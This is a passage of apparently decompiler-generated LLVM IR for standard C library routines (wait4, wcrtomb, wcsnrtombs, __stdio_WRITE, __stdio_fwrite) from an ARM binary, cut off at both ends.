  %v7_ec74 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_ec74, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_ec74, -4095
  br i1 %tmp13, label %dec_label_pc_ec94, label %dec_label_pc_ec84

dec_label_pc_ec84:                                ; preds = %dec_label_pc_ec74
  %v0_ec84 = call i32 @__errno_location()
  %v0_ec88 = load i32, i32* %r4.global-to-local, align 4
  %v1_ec88 = sub i32 0, %v0_ec88
  %v2_ec8c = inttoptr i32 %v0_ec84 to i32*
  store i32 %v1_ec88, i32* %v2_ec8c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ec94

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec74, %dec_label_pc_ec84
  %v0_ec94 = phi i32 [ %v7_ec74, %dec_label_pc_ec74 ], [ -1, %dec_label_pc_ec84 ]
  store i32 %v0_ec94, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ec98

dec_label_pc_ec98:                                ; preds = %dec_label_pc_ec60, %dec_label_pc_ec94
  %v0_ec98 = phi i32 [ %v0_ec98.pre, %dec_label_pc_ec60 ], [ %v0_ec94, %dec_label_pc_ec94 ]
  %v2_ec9c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ec9c, i32* @r4, align 4
  ret i32 %v0_ec98

; uselistorder directives
  uselistorder i32 %v7_ec74, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_ec98, { 1, 0 }
  uselistorder label %dec_label_pc_ec94, { 1, 0 }
  uselistorder label %dec_label_pc_ec74, { 1, 0 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_eca0 = load i32, i32* @r4, align 4
  store i32 %v3_eca0, i32* %stack_var_-8, align 4
  %v0_eca4 = call i32 @wait4()
  store i32 %v0_eca4, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_eca4, -4095
  br i1 %tmp, label %dec_label_pc_ecc4, label %dec_label_pc_ecb4

dec_label_pc_ecb4:                                ; preds = %entry
  %v0_ecb4 = call i32 @__errno_location()
  %v0_ecb8 = load i32, i32* %r4.global-to-local, align 4
  %v1_ecb8 = sub i32 0, %v0_ecb8
  %v2_ecbc = inttoptr i32 %v0_ecb4 to i32*
  store i32 %v1_ecb8, i32* %v2_ecbc, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_ecc4

dec_label_pc_ecc4:                                ; preds = %entry, %dec_label_pc_ecb4
  %v0_ecc4 = phi i32 [ %v0_eca4, %entry ], [ -1, %dec_label_pc_ecb4 ]
  %v2_ecc8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ecc8, i32* @r4, align 4
  ret i32 %v0_ecc4

; uselistorder directives
  uselistorder i32 %v0_eca4, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ecc4, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_20e2c.665 to i32)
}

define i32 @__GI_wcrtomb(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_ecdc = icmp eq i32 %arg1, 0
  br i1 %v2_ecdc, label %bb, label %.thread

.thread:                                          ; preds = %entry
  br label %bb11

bb:                                               ; preds = %entry
  %v3_ece4 = ptrtoint i32* %stack_var_-32 to i32
  br label %bb11

bb11:                                             ; preds = %.thread, %bb
  %v0_ed0c = phi i32 [ %arg2, %.thread ], [ 0, %bb ]
  %v0_ed00 = phi i32 [ %arg1, %.thread ], [ %v3_ece4, %bb ]
  store i32 %arg3, i32* @r4, align 4
  store i32 16, i32* @r3, align 4
  %v2_ecf8 = ptrtoint i32* %stack_var_-16 to i32
  %v2_ed04 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_ed04, i32* %stack_var_-16, align 4
  store i32 %v0_ed0c, i32* %stack_var_-12, align 4
  %v5_ed14 = inttoptr i32 %v0_ed00 to i8*
  %v6_ed14 = call i32 @__GI_wcsnrtombs(i8* %v5_ed14, i32 %v2_ecf8, i32 1, i32 16, i32 %arg3)
  %v2_ed18 = icmp eq i32 %v6_ed14, 0
  br i1 %v2_ed18, label %bb12, label %bb13

bb12:                                             ; preds = %bb11
  br label %bb13

bb13:                                             ; preds = %bb11, %bb12
  %v8_ed24 = phi i32 [ %v6_ed14, %bb11 ], [ 1, %bb12 ]
  ret i32 %v8_ed24

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %bb13, { 1, 0 }
  uselistorder label %bb11, { 1, 0 }
}

define i32 @__GI_wcsrtombs() local_unnamed_addr {
entry:
  %v0_ed34 = load i32, i32* @r2, align 4
  store i32 %v0_ed34, i32* @r3, align 4
  %v0_ed3c = load i32, i32* @r0, align 4
  %v1_ed3c = load i32, i32* @r1, align 4
  %v5_ed3c = inttoptr i32 %v0_ed3c to i8*
  %v6_ed3c = call i32 @__GI_wcsnrtombs(i8* %v5_ed3c, i32 %v1_ed3c, i32 -1, i32 %v0_ed34, i32 ptrtoint (i32* @0 to i32))
  ret i32 %v6_ed3c
}

define i32 @__GI_wcsnrtombs(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_ed48 = load i32, i32* @r4, align 4
  store i32 %v3_ed48, i32* %stack_var_-8, align 4
  %v10_ed4c = icmp eq i32 %tmp, %arg2
  br i1 %v10_ed4c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v0_ed541 = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ed68

bb:                                               ; preds = %entry
  %v4_ed50 = icmp eq i8* %arg1, null
  %v0_ed54 = load i32, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @ip, align 4
  br i1 %v4_ed50, label %dec_label_pc_ed68, label %bb27

bb27:                                             ; preds = %bb
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eda4

dec_label_pc_ed68:                                ; preds = %.thread, %bb
  %v1_eda8.ph = phi i32 [ %v0_ed54, %bb ], [ %v0_ed541, %.thread ]
  %v2_ed583.ph = ptrtoint i32* %stack_var_-24 to i32
  %v3_ed68 = icmp eq i8* %arg1, null
  store i32 %v2_ed583.ph, i32* @ip, align 4
  br i1 %v3_ed68, label %.thread4, label %dec_label_pc_ed9c

.thread4:                                         ; preds = %dec_label_pc_ed68
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  br label %dec_label_pc_eda4

dec_label_pc_ed80:                                ; preds = %dec_label_pc_edbc
  %v0_ed80 = call i32 @__errno_location()
  store i32 %v0_ed80, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_ed8c = inttoptr i32 %v0_ed80 to i32*
  store i32 84, i32* %v2_ed8c, align 4
  %v0_edf8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_edf8

dec_label_pc_ed94:                                ; preds = %dec_label_pc_edcc
  %v3_edd0 = zext i8 %v2_edd0 to i32
  store i32 %v3_edd0, i32* @lr, align 4
  br label %dec_label_pc_edec

dec_label_pc_ed9c:                                ; preds = %dec_label_pc_ed68
  store i32 %v2_ed583.ph, i32* @ip, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_eda4

dec_label_pc_eda4:                                ; preds = %bb27, %.thread4, %dec_label_pc_ed9c
  %v1_eda820 = phi i32 [ %v0_ed54, %bb27 ], [ %v1_eda8.ph, %.thread4 ], [ %v1_eda8.ph, %dec_label_pc_ed9c ]
  %v2_edcc14 = phi i32 [ %tmp, %bb27 ], [ %v2_ed583.ph, %.thread4 ], [ %v2_ed583.ph, %dec_label_pc_ed9c ]
  %v1_eda4 = load i32, i32* @r3, align 4
  %v3_eda4 = icmp uge i32 %v1_eda820, %v1_eda4
  %v1_eda4.v1_eda820 = select i1 %v3_eda4, i32 %v1_eda4, i32 %v1_eda820
  store i32 %v1_eda4.v1_eda820, i32* %r4.global-to-local, align 4
  %v1_edb0 = inttoptr i32 %arg2 to i32*
  %v2_edb0 = load i32, i32* %v1_edb0, align 4
  store i32 %v2_edb0, i32* @lr, align 4
  store i32 %v1_eda4.v1_eda820, i32* %r0.global-to-local, align 4
  %v2_ede48 = icmp eq i32 %v1_eda4.v1_eda820, 0
  br i1 %v2_ede48, label %dec_label_pc_edec, label %dec_label_pc_edbc

dec_label_pc_edbc:                                ; preds = %dec_label_pc_eda4, %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge
  %v2_edcc = phi i32 [ %v2_eddc, %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge ], [ %v2_edcc14, %dec_label_pc_eda4 ]
  %v0_edc4 = phi i32 [ %v0_edbc.pre, %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge ], [ %v2_edb0, %dec_label_pc_eda4 ]
  %v1_edbc = inttoptr i32 %v0_edc4 to i32*
  %v2_edbc = load i32, i32* %v1_edbc, align 4
  %v1_edc4 = add i32 %v0_edc4, 4
  store i32 %v1_edc4, i32* @lr, align 4
  %tmp36 = icmp ugt i32 %v2_edbc, 127
  br i1 %tmp36, label %dec_label_pc_ed80, label %dec_label_pc_edcc

dec_label_pc_edcc:                                ; preds = %dec_label_pc_edbc
  %v1_edcc = trunc i32 %v2_edbc to i8
  %v3_edcc = inttoptr i32 %v2_edcc to i8*
  store i8 %v1_edcc, i8* %v3_edcc, align 1
  %v0_edd0 = load i32, i32* @ip, align 4
  %v1_edd0 = inttoptr i32 %v0_edd0 to i8*
  %v2_edd0 = load i8, i8* %v1_edd0, align 1
  %v2_edd4 = icmp eq i8 %v2_edd0, 0
  br i1 %v2_edd4, label %dec_label_pc_ed94, label %dec_label_pc_eddc

dec_label_pc_eddc:                                ; preds = %dec_label_pc_edcc
  %v1_eddc = load i32, i32* %r2.global-to-local, align 4
  %v2_eddc = add i32 %v1_eddc, %v0_edd0
  store i32 %v2_eddc, i32* @ip, align 4
  %v0_ede0 = load i32, i32* %r0.global-to-local, align 4
  %v1_ede0 = add i32 %v0_ede0, -1
  store i32 %v1_ede0, i32* %r0.global-to-local, align 4
  %v2_ede4 = icmp eq i32 %v1_ede0, 0
  br i1 %v2_ede4, label %dec_label_pc_edec, label %dec_label_pc_eddc.dec_label_pc_edbc_crit_edge

dec_label_pc_eddc.dec_label_pc_edbc_crit_edge:    ; preds = %dec_label_pc_eddc
  %v0_edbc.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_edbc

dec_label_pc_edec:                                ; preds = %dec_label_pc_eddc, %dec_label_pc_eda4, %dec_label_pc_ed94
  %v0_edec = phi i32 [ %v0_edd0, %dec_label_pc_ed94 ], [ %v2_edcc14, %dec_label_pc_eda4 ], [ %v2_eddc, %dec_label_pc_eddc ]
  %v1_edec = load i32, i32* @sp, align 4
  %v9_edec = icmp eq i32 %v0_edec, %v1_edec
  br i1 %v9_edec, label %bb31, label %bb30

bb30:                                             ; preds = %dec_label_pc_edec
  %v1_edf0 = load i32, i32* @lr, align 4
  store i32 %v1_edf0, i32* %v1_edb0, align 4
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_edec, %bb30
  %v0_edf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_edf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_edf4 = sub i32 %v1_edf4, %v0_edf4
  store i32 %v2_edf4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_edf8

dec_label_pc_edf8:                                ; preds = %dec_label_pc_ed80, %bb31
  %v0_edf8 = phi i32 [ %v0_edf8.pre, %dec_label_pc_ed80 ], [ %v2_edf4, %bb31 ]
  store i32 %v0_edf8, i32* %r0.global-to-local, align 4
  %v2_ee00 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_ee00, i32* %r4.global-to-local, align 4
  ret i32 %v0_edf8

; uselistorder directives
  uselistorder i32 %v0_edf8, { 1, 0 }
  uselistorder i32 %v1_ede0, { 1, 0 }
  uselistorder i32 %v2_eddc, { 0, 2, 1 }
  uselistorder i32 %v2_edbc, { 1, 0 }
  uselistorder i32 %v2_edcc14, { 1, 0 }
  uselistorder i32 %v1_eda8.ph, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 8, 6, 4, 5, 7, 9, 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 6, 3, 0 }
  uselistorder i32* @sp, { 1, 2, 0 }
  uselistorder i32 127, { 0, 1, 3, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_edf8, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_edbc, { 1, 0 }
  uselistorder label %dec_label_pc_eda4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_ed68, { 1, 0 }
}

define i32 @__stdio_WRITE(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  %v2_ee182 = icmp eq i32 %arg3, 0
  store i1 %v2_ee182, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r2, align 4
  br i1 %v2_ee182, label %dec_label_pc_eeb8, label %dec_label_pc_ee24

dec_label_pc_ee18thread-pre-split:                ; preds = %bb22
  %v3_ee3c = load i32, i32* %r7.global-to-local, align 4
  %v5_ee3c = add i32 %v3_ee3c, %v4_ee30
  store i32 %v5_ee3c, i32* %r7.global-to-local, align 4
  %v5_ee40 = sub i32 %v0_ee38, %v4_ee30
  store i32 %v5_ee40, i32* %r5.global-to-local, align 4
  %v2_ee18 = icmp eq i32 %v5_ee40, 0
  store i1 %v2_ee18, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_ee40, i32* @r2, align 4
  br i1 %v2_ee18, label %dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge, label %dec_label_pc_ee24

dec_label_pc_ee24:                                ; preds = %entry, %dec_label_pc_ee18thread-pre-split
  %v0_ee28 = phi i32 [ %v5_ee3c, %dec_label_pc_ee18thread-pre-split ], [ %arg2, %entry ]
  %v0_ee24.in = phi i32 [ %v5_ee40, %dec_label_pc_ee18thread-pre-split ], [ %arg3, %entry ]
  %v0_ee24 = icmp slt i32 %v0_ee24.in, 0
  br i1 %v0_ee24, label %bb, label %bb22

bb:                                               ; preds = %dec_label_pc_ee24
  store i32 2147483647, i32* @r2, align 4
  br label %bb22

bb22:                                             ; preds = %dec_label_pc_ee24, %bb
  %v0_ee2c = load i32, i32* @r4, align 4
  %v1_ee2c = add i32 %v0_ee2c, 4
  %v2_ee2c = inttoptr i32 %v1_ee2c to i32*
  %v3_ee2c = load i32, i32* %v2_ee2c, align 4
  store i32 %v3_ee2c, i32* %r0.global-to-local, align 4
  %tmp23 = inttoptr i32 %v0_ee28 to i32*
  %v4_ee30 = call i32 @__libc_write(i32 %v3_ee2c, i32* %tmp23)
  store i32 %v4_ee30, i32* %r0.global-to-local, align 4
  %v1_ee34 = icmp slt i32 %v4_ee30, 0
  %v2_ee34 = icmp eq i32 %v4_ee30, 0
  store i1 %v2_ee34, i1* %cpsr_z.global-to-local, align 1
  %v0_ee38 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ee38, i32* %r6.global-to-local, align 4
  br i1 %v1_ee34, label %dec_label_pc_ee48, label %dec_label_pc_ee18thread-pre-split

dec_label_pc_ee48:                                ; preds = %bb22
  %v0_ee48 = load i32, i32* @r4, align 4
  %v1_ee48 = inttoptr i32 %v0_ee48 to i32*
  %v2_ee48 = load i32, i32* %v1_ee48, align 4
  store i32 %v2_ee48, i32* %r3.global-to-local, align 4
  %v1_ee4c = add i32 %v0_ee48, 8
  store i32 %v1_ee4c, i32* %r0.global-to-local, align 4
  %v1_ee50 = inttoptr i32 %v1_ee4c to i32*
  %v2_ee50 = load i32, i32* %v1_ee50, align 4
  store i32 %v2_ee50, i32* %r0.global-to-local, align 4
  %v3_ee50 = add i32 %v0_ee48, 12
  %v4_ee50 = inttoptr i32 %v3_ee50 to i32*
  %v5_ee50 = load i32, i32* %v4_ee50, align 4
  %v1_ee54 = or i32 %v2_ee48, 8
  store i32 %v1_ee54, i32* %r3.global-to-local, align 4
  %v3_ee58 = sdiv i32 %v2_ee48, 256
  %v2_ee5c = sub i32 %v5_ee50, %v2_ee50
  store i32 %v2_ee5c, i32* %r2.global-to-local, align 4
  %v9_ee5c = icmp eq i32 %v5_ee50, %v2_ee50
  store i1 %v9_ee5c, i1* %cpsr_z.global-to-local, align 1
  %v1_ee60 = trunc i32 %v3_ee58 to i8
  %v3_ee60 = add i32 %v0_ee48, 1
  %v4_ee60 = inttoptr i32 %v3_ee60 to i8*
  store i8 %v1_ee60, i8* %v4_ee60, align 1
  %v0_ee64 = load i32, i32* %r3.global-to-local, align 4
  %v1_ee64 = trunc i32 %v0_ee64 to i8
  %v2_ee64 = load i32, i32* @r4, align 4
  %v3_ee64 = inttoptr i32 %v2_ee64 to i8*
  store i8 %v1_ee64, i8* %v3_ee64, align 1
  %v0_ee68 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ee68, label %dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge, label %dec_label_pc_ee6c

dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge:    ; preds = %dec_label_pc_ee48
  %v0_eeb4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_eeb4

dec_label_pc_ee6c:                                ; preds = %dec_label_pc_ee48
  %v0_ee6c = load i32, i32* %r2.global-to-local, align 4
  %v1_ee6c = load i32, i32* %r5.global-to-local, align 4
  %v9_ee6c = icmp eq i32 %v0_ee6c, %v1_ee6c
  store i1 %v9_ee6c, i1* %cpsr_z.global-to-local, align 1
  %tmp29 = icmp ugt i32 %v0_ee6c, %v1_ee6c
  br i1 %tmp29, label %.preheader, label %bb24

bb24:                                             ; preds = %dec_label_pc_ee6c
  store i32 %v0_ee6c, i32* %r6.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_ee6c, %bb24
  %v0_ee74.pre = load i32, i32* %r7.global-to-local, align 4
  %v2_ee78.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb25

bb25:                                             ; preds = %.preheader, %dec_label_pc_ee98
  %v2_ee78 = phi i32 [ %v2_ee78.pre, %.preheader ], [ %v1_ee9c, %dec_label_pc_ee98 ]
  %v0_ee74 = phi i32 [ %v0_ee74.pre, %.preheader ], [ %v1_ee84, %dec_label_pc_ee98 ]
  %v1_ee74 = inttoptr i32 %v0_ee74 to i8*
  %v2_ee74 = load i8, i8* %v1_ee74, align 1
  %v3_ee74 = zext i8 %v2_ee74 to i32
  store i32 %v3_ee74, i32* %r3.global-to-local, align 4
  %v3_ee78 = inttoptr i32 %v2_ee78 to i8*
  store i8 %v2_ee74, i8* %v3_ee78, align 1
  %v0_ee7c = load i32, i32* %r0.global-to-local, align 4
  %v1_ee7c = inttoptr i32 %v0_ee7c to i8*
  %v2_ee7c = load i8, i8* %v1_ee7c, align 1
  %v3_ee7c = zext i8 %v2_ee7c to i32
  store i32 %v3_ee7c, i32* %r3.global-to-local, align 4
  %v7_ee80 = icmp eq i8 %v2_ee7c, 10
  store i1 %v7_ee80, i1* %cpsr_z.global-to-local, align 1
  %v0_ee84 = load i32, i32* %r7.global-to-local, align 4
  %v1_ee84 = add i32 %v0_ee84, 1
  store i32 %v1_ee84, i32* %r7.global-to-local, align 4
  br i1 %v7_ee80, label %dec_label_pc_ee8c, label %dec_label_pc_ee98

dec_label_pc_ee8c:                                ; preds = %bb25
  %v0_ee8c = load i32, i32* @r4, align 4
  %v1_ee8c = add i32 %v0_ee8c, 1
  %v2_ee8c = inttoptr i32 %v1_ee8c to i8*
  %v3_ee8c = load i8, i8* %v2_ee8c, align 1
  %v4_ee8c = zext i8 %v3_ee8c to i32
  store i32 %v4_ee8c, i32* %r3.global-to-local, align 4
  %tmp30 = urem i8 %v3_ee8c, 2
  %v2_ee90 = icmp eq i8 %tmp30, 0
  store i1 %v2_ee90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee90, label %dec_label_pc_ee98, label %dec_label_pc_eea4

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee8c, %bb25
  %v0_ee98 = load i32, i32* %r6.global-to-local, align 4
  %v1_ee98 = add i32 %v0_ee98, -1
  store i32 %v1_ee98, i32* %r6.global-to-local, align 4
  %v7_ee98 = icmp eq i32 %v0_ee98, 1
  store i1 %v7_ee98, i1* %cpsr_z.global-to-local, align 1
  %v1_ee9c = add i32 %v0_ee7c, 1
  store i32 %v1_ee9c, i32* %r0.global-to-local, align 4
  br i1 %v7_ee98, label %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge, label %bb25

dec_label_pc_ee98.dec_label_pc_eea4_crit_edge:    ; preds = %dec_label_pc_ee98
  %v0_eea4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_eea4

dec_label_pc_eea4:                                ; preds = %dec_label_pc_ee8c, %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge
  %v0_eea8 = phi i32 [ %v1_ee9c, %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge ], [ %v0_ee7c, %dec_label_pc_ee8c ]
  %v0_eea4 = phi i32 [ %v0_eea4.pre, %dec_label_pc_ee98.dec_label_pc_eea4_crit_edge ], [ %v0_ee8c, %dec_label_pc_ee8c ]
  %v1_eea4 = add i32 %v0_eea4, 8
  %v2_eea4 = inttoptr i32 %v1_eea4 to i32*
  %v3_eea4 = load i32, i32* %v2_eea4, align 4
  store i32 %v3_eea4, i32* %r3.global-to-local, align 4
  %v2_eea8 = add i32 %v0_eea4, 16
  %v3_eea8 = inttoptr i32 %v2_eea8 to i32*
  store i32 %v0_eea8, i32* %v3_eea8, align 4
  %v0_eeac = load i32, i32* %r3.global-to-local, align 4
  %v1_eeac = load i32, i32* %r0.global-to-local, align 4
  %v2_eeac = sub i32 %v1_eeac, %v0_eeac
  store i32 %v2_eeac, i32* %r3.global-to-local, align 4
  %v1_eeb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_eeb0 = sub i32 %v1_eeb0, %v2_eeac
  store i32 %v2_eeb0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_eeb4

dec_label_pc_eeb4:                                ; preds = %dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge, %dec_label_pc_eea4
  %v0_eeb4 = phi i32 [ %v0_eeb4.pre, %dec_label_pc_ee48.dec_label_pc_eeb4_crit_edge ], [ %v2_eeb0, %dec_label_pc_eea4 ]
  %v1_eeb4 = load i32, i32* %r8.global-to-local, align 4
  %v2_eeb4 = sub i32 %v1_eeb4, %v0_eeb4
  store i32 %v2_eeb4, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_eeb8

dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge: ; preds = %dec_label_pc_ee18thread-pre-split
  %v0_eeb8.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %entry, %dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge, %dec_label_pc_eeb4
  %v0_eeb8 = phi i32 [ %v2_eeb4, %dec_label_pc_eeb4 ], [ %v0_eeb8.pre.pre, %dec_label_pc_ee18.dec_label_pc_eeb8.loopexit_crit_edge ], [ 0, %entry ]
  store i32 %v0_eeb8, i32* %r0.global-to-local, align 4
  ret i32 %v0_eeb8

; uselistorder directives
  uselistorder i32 %v0_eeb8, { 1, 0 }
  uselistorder i32 %v0_eea4, { 1, 0 }
  uselistorder i32 %v1_ee9c, { 0, 2, 1 }
  uselistorder i32 %v0_ee98, { 1, 0 }
  uselistorder i1 %v2_ee90, { 1, 0 }
  uselistorder i32 %v1_ee84, { 1, 0 }
  uselistorder i32 %v0_ee6c, { 1, 0, 2 }
  uselistorder i32 %v5_ee50, { 1, 0 }
  uselistorder i32 %v2_ee50, { 1, 0, 2 }
  uselistorder i32 %v0_ee38, { 1, 0 }
  uselistorder i32 %v4_ee30, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v5_ee40, { 0, 2, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 3, 2, 1, 4, 5 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r5.global-to-local, { 0, 3, 4, 2, 5, 1, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 5, 3, 6, 7, 9, 8, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder label %dec_label_pc_eeb8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_eeb4, { 1, 0 }
  uselistorder label %dec_label_pc_eea4, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %dec_label_pc_ee24, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_eec0 = load i32, i32* @r4, align 4
  store i32 %v3_eec0, i32* %stack_var_-20, align 4
  %v6_eec0 = load i32, i32* @r5, align 4
  %v9_eec0 = load i32, i32* @r6, align 4
  %v12_eec0 = load i32, i32* @r7, align 4
  %v15_eec0 = load i32, i32* @lr, align 4
  %v1_eec4 = add i32 %arg3, 1
  %v2_eec4 = inttoptr i32 %v1_eec4 to i8*
  %v3_eec4 = load i8, i8* %v2_eec4, align 1
  %v4_eec4 = zext i8 %v3_eec4 to i32
  %v3_eec8 = mul nuw nsw i32 %v4_eec4, 256
  %v1_eecc = and i32 %v3_eec8, 512
  store i32 %v1_eecc, i32* @r4, align 4
  %v2_eecc = icmp eq i32 %v1_eecc, 0
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  br i1 %v2_eecc, label %dec_label_pc_eee0, label %dec_label_pc_efdc

dec_label_pc_eee0:                                ; preds = %entry
  %v1_eee0 = add i32 %arg3, 4
  %v2_eee0 = inttoptr i32 %v1_eee0 to i32*
  %v3_eee0 = load i32, i32* %v2_eee0, align 4
  %v1_eee8 = add i32 %arg3, 16
  %v2_eee8 = inttoptr i32 %v1_eee8 to i32*
  %v3_eee8 = load i32, i32* %v2_eee8, align 4
  store i32 %v3_eee8, i32* @r0, align 4
  %v1_eeec = add i32 %arg3, 12
  %v2_eeec = inttoptr i32 %v1_eeec to i32*
  %v3_eeec = load i32, i32* %v2_eeec, align 4
  %v4_eef0 = icmp eq i32 %v3_eee0, -2
  %v2_eef4 = sub i32 %v3_eeec, %v3_eee8
  br i1 %v4_eef0, label %dec_label_pc_eef4, label %dec_label_pc_ef1c

dec_label_pc_eef4:                                ; preds = %dec_label_pc_eee0
  %v3_eef8 = icmp ugt i32 %v2_eef4, %arg2
  br i1 %v3_eef8, label %bb, label %bb10

bb:                                               ; preds = %dec_label_pc_eef4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_eef4, %bb
  %storemerge = phi i32 [ %arg2, %bb ], [ %v2_eef4, %dec_label_pc_eef4 ]
  %v0_ef00 = phi i32 [ %arg2, %bb ], [ %v2_eef4, %dec_label_pc_eef4 ]
  store i32 %storemerge, i32* @r4, align 4
  store i32 %v0_ef00, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_ef08 = call i32 @memcpy()
  %v0_ef0c = load i32, i32* @r5, align 4
  %v1_ef0c = add i32 %v0_ef0c, 16
  %v2_ef0c = inttoptr i32 %v1_ef0c to i32*
  %v3_ef0c = load i32, i32* %v2_ef0c, align 4
  %v1_ef10 = load i32, i32* @r4, align 4
